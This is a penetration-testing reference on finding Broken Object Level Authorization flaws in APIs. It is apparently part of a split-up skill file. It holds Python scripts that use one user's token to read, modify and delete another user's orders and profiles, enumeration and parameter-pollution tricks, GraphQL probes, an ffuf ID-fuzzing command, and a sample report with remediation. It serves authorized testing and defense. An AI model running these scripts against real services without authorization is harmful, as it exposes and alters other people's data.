# testing-api-for-broken-object-level-authorization — 详细参考（由 SKILL.md 拆分）

# Test 1: Access User B's profile with User A's token
resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
results.append({
    "test": "Access other user profile",
    "endpoint": f"GET /users/{user_b_id}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code == 200,
    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
})

# Test 2: Access User B's orders with User A's token
for order_id in user_b_order_ids:
    resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
    results.append({
        "test": f"Access other user order {order_id}",
        "endpoint": f"GET /orders/{order_id}",
        "auth": "User A",
        "status": resp.status_code,
        "vulnerable": resp.status_code == 200
    })

# Test 3: Modify User B's order with User A's token
resp = requests.patch(
    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
    headers=user_a_headers,
    json={"status": "cancelled"}
)
results.append({
    "test": "Modify other user order",
    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})

# Test 4: Delete User B's resource with User A's token
resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
results.append({
    "test": "Delete other user order",
    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
    "auth": "User A",
    "status": resp.status_code,
    "vulnerable": resp.status_code in (200, 204)
})

# Print results
for r in results:
    status = "VULNERABLE" if r["vulnerable"] else "SECURE"
    print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
```

### Step 4: Advanced BOLA Techniques

Test for less obvious BOLA patterns:

```python
# Technique 1: Parameter pollution - send both IDs
resp = requests.get(
    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
    headers=user_a_headers
)
print(f"Parameter pollution: {resp.status_code}")

# Technique 2: JSON body object ID override
resp = requests.post(
    f"{BASE_URL}/orders/details",
    headers=user_a_headers,
    json={"order_id": user_b_order_ids[0]}
)
print(f"Body ID override: {resp.status_code}")

# Technique 3: Array of IDs - include other user's IDs in batch request
resp = requests.post(
    f"{BASE_URL}/orders/batch",
    headers=user_a_headers,
    json={"order_ids": user_a_order_ids + user_b_order_ids}
)
print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")

# Technique 4: Numeric ID manipulation for sequential IDs
for offset in range(-5, 6):
    test_id = user_a_order_ids[0] + offset
    if test_id not in user_a_order_ids:
        resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
        if resp.status_code == 200:
            owner = resp.json().get("user_id", "unknown")
            if str(owner) != str(user_a_id):
                print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")

# Technique 5: Swap object ID in nested resource paths
resp = requests.get(
    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
    headers=user_a_headers
)
print(f"Nested resource BOLA: {resp.status_code}")

# Technique 6: Method switching - GET may be blocked but PUT allowed
for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
    resp = requests.request(
        method,
        f"{BASE_URL}/users/{user_b_id}/settings",
        headers=user_a_headers,
        json={"notifications": False} if method in ('PUT', 'PATCH') else None
    )
    if resp.status_code not in (401, 403, 405):
        print(f"Method {method} on other user settings: {resp.status_code}")
```

### Step 5: Automated BOLA Detection with Autorize (Burp Suite)

Configure Autorize for automated detection:

1. Install Autorize from the BApp Store in Burp Suite Professional
2. In the Autorize tab, paste User B's authentication cookie or header
3. Configure the interception filters:
   - Include: `.*\/api\/.*` (only API paths)
   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
4. Set the enforcement detector:
   - Add conditions where response length or status code differs between User A and User B
   - Mark as "enforced" if User A gets 403/401 for User B's resources
   - Mark as "bypassed" if User A gets 200 with User B's data
5. Browse the application as User A; Autorize automatically replays each request with User B's token
6. Review the Autorize results table:
   - Green = Authorization enforced (secure)
   - Red = Authorization bypassed (BOLA vulnerability)
   - Orange = Needs manual review (ambiguous response)

### Step 6: GraphQL BOLA Testing

```graphql
# Test BOLA in GraphQL queries using node/ID relay pattern
# User A queries User B's order by global relay ID
query {
  node(id: "T3JkZXI6NTAwMw==") {  # Base64 of "Order:5003" (User B's)
    ... on Order {
      id
      totalAmount
      shippingAddress {
        street
        city
      }
      items {
        productName
        quantity
      }
    }
  }
}

# Test nested object access through relationships
query {
  user(id: "1002") {  # User B's ID
    email
    phoneNumber
    orders {
      edges {
        node {
          id
          totalAmount
          paymentMethod {
            lastFourDigits
          }
        }
      }
    }
  }
}
```

## Key Concepts

| Term | Definition |
|------|------------|
| **BOLA** | Broken Object Level Authorization (OWASP API1:2023) - the API does not verify that the authenticated user has permission to access the specific object referenced by the request |
| **IDOR** | Insecure Direct Object Reference - a closely related term where the application uses user-controllable input to directly access objects without authorization checks |
| **Horizontal Privilege Escalation** | Accessing resources belonging to another user at the same privilege level by manipulating object identifiers |
| **Vertical Privilege Escalation** | Accessing resources or functions restricted to a higher privilege level (e.g., regular user accessing admin endpoints) |
| **Object ID Enumeration** | Predicting valid object identifiers by analyzing their format (sequential integers, UUID patterns, encoded values) |
| **Autorize** | A Burp Suite extension that automates authorization testing by replaying requests with different user tokens |

## Tools & Systems

- **Burp Suite Professional**: Intercepting proxy for capturing and manipulating API requests with Autorize extension for automated BOLA testing
- **OWASP ZAP**: Open-source alternative with Access Control Testing add-on for authorization boundary testing
- **Autorize**: Burp extension that automatically detects authorization enforcement by replaying requests with different user contexts
- **Postman**: API testing platform for crafting and replaying requests with different authentication tokens across collections
- **ffuf**: Web fuzzer that can enumerate object IDs at scale: `ffuf -u https://api.example.com/orders/FUZZ -w ids.txt -H "Authorization: Bearer token"`

## Common Scenarios

### Scenario: E-Commerce API BOLA Assessment

**Context**: An e-commerce platform exposes a REST API for its mobile app. The API uses sequential integer IDs for orders, users, and addresses. Two test accounts are provided: a regular customer (User A, ID 1001) and another customer (User B, ID 1002).

**Approach**:
1. Map all endpoints from the Swagger spec at `/api/docs`: identify 47 endpoints, 23 of which take object IDs
2. Capture User A's requests for their own resources: profile, orders, addresses, payment methods, wishlist
3. Replace User A's object IDs with User B's IDs systematically across all 23 endpoints
4. Find that `GET /api/v1/orders/{id}` returns any order regardless of ownership (BOLA on read)
5. Find that `PATCH /api/v1/addresses/{id}` allows modifying any user's address (BOLA on write)
6. Find that `GET /api/v1/users/{id}/payment-methods` leaks payment card last-four digits for any user
7. Test batch endpoint `POST /api/v1/orders/export` - accepts array of order IDs and exports all without ownership check
8. Verify that `DELETE /api/v1/orders/{id}` correctly returns 403 for non-owned orders (authorization enforced)

**Pitfalls**:
- Only testing GET requests and missing BOLA in PUT/PATCH/DELETE methods that allow data modification or destruction
- Assuming UUIDs prevent BOLA - UUIDs are less predictable but can be leaked in API responses, logs, or URL parameters
- Not testing nested resource paths where authorization may be checked on the parent but not the child resource
- Missing BOLA in bulk/batch endpoints that accept arrays of object IDs
- Not considering that different API versions (v1 vs v2) may have different authorization implementations

## Output Format

```
## Finding: Broken Object Level Authorization in Order API

**ID**: API-BOLA-001
**Severity**: High (CVSS 7.5)
**OWASP API**: API1:2023 - Broken Object Level Authorization
**Affected Endpoints**:
  - GET /api/v1/orders/{id}
  - PATCH /api/v1/addresses/{id}
  - GET /api/v1/users/{id}/payment-methods
  - POST /api/v1/orders/export

**Description**:
The API does not enforce object-level authorization on order retrieval,
address modification, payment method viewing, or order export endpoints.
An authenticated user can access or modify any other user's resources by
substituting object IDs in the request. Sequential integer IDs make
enumeration trivial.

**Proof of Concept**:
1. Authenticate as User A (ID 1001): POST /api/v1/auth/login
2. Retrieve User A's order: GET /api/v1/orders/5001 -> 200 OK (legitimate)
3. Access User B's order: GET /api/v1/orders/5003 -> 200 OK (BOLA - returns full order details)
4. Modify User B's address: PATCH /api/v1/addresses/2002 -> 200 OK (BOLA - address changed)

**Impact**:
- Read access to all 850,000+ customer orders including shipping addresses and order contents
- Write access to any customer's delivery address, enabling package redirection
- Exposure of partial payment card data for all customers

**Remediation**:
1. Implement object-level authorization middleware that verifies the authenticated user owns the requested resource
2. Use authorization checks at the data access layer: `WHERE order.user_id = authenticated_user.id`
3. Replace sequential integer IDs with UUIDs to reduce predictability (defense in depth, not a fix alone)
4. Add authorization tests to the CI/CD pipeline for every endpoint that accepts object IDs
5. Implement rate limiting per user to slow enumeration attempts
```
